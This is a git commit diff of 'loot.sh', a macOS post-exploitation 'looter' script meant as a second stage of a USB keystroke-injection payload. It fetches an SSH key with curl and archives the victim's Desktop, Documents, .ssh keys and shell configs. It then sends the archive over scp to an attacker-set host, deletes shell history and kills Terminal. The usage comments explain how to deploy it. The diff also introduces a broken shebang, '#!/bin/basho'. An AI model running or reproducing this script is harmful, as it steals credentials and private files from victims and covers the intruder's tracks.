7e1950efb7c0994575eb50028c1af39adb5d2d3e
un1x01d <>
2022-08-19 16:08:55 -0400

    refactor to use a script

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -1,22 +1,38 @@
-#!/bin/bash
+#!/bin/basho
+# 
+# MacOS Post explotation looter
+# ----------------------- 
 
-HOME="/Users/$USER"
-SSH_HOST="192.168.1.216"
-SSH_USER="zed"
-SSH_KEY_URL="http://192.168.1.216/sh"
+# This script will loot the Desktop and Documents directories and some other important files.
+# The looted files will be compressed and uploaded over SCP to the set destination
+# Originally this script was written as a second stage of a Duckyscript payload, but can be used without it.
+
+# Usage:
+#  - Upload the pivate key to any web server (for external just use dropbox).
+#  - Set the URL to the key uploaded.
+#  - Set the SSH server address
+#  - Run! - The file will be saved as .loot.tgz on the remote host.
+
+
+
+SSH_HOST=""
+SSH_USER=""
+SSH_KEY_URL=""
+HOME_DIR="/Users/$USER"
 LOCAL_LOOT_PATH="/tmp/.s/.t/.e/.a/.l/"
 REMOTE_LOOT_PATH="~/demo/"
 
 
 mkdir -p $LOCAL_LOOT_PATH
-curl -s http://192.168.1.216/sh -o $LOCAL_LOOT_PATH/.s 
+curl -s $SSH_KEY_URL -o $LOCAL_LOOT_PATH/.s 
 chmod 600 $LOCAL_LOOT_PATH/.s
 
 cd $LOCAL_LOOT_PATH
-tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
+tar cfz .loot.tgz $HOME_DIR/Desktop $HOME_DIR/Documents $HOME_DIR/.ssh $HOME_DIR/.bash* $HOME_DIR/.config $HOME_DIR/.zsh*
 
-scp -q -o StrictHostKeyChecking=no -i $LOCAL_LOOT_PATHs/.s $LOCAL_LOOT_PATH/loot.tgz zed@$SSH_HOST:$REMOTE_LOOT_PATH
+scp -o StrictHostKeyChecking=no -i $LOCAL_LOOT_PATH/.s $LOCAL_LOOT_PATH/.loot.tgz ${SSH_USER}@${SSH_HOST}:$REMOTE_LOOT_PATH
 
-set -e && rm -f $HOME/Desktop/.s.png && rm -rf /tmp/.s $HOME/.bash_history $HOME/.zsh_history && history -c
+set -e && rm -f $HOME_DIR/Desktop/.s.png && rm -rf /tmp/.s $HOME_DIR/.bash_history $HOME_DIR/.zsh_history && history -c
 
 killall Terminal
+
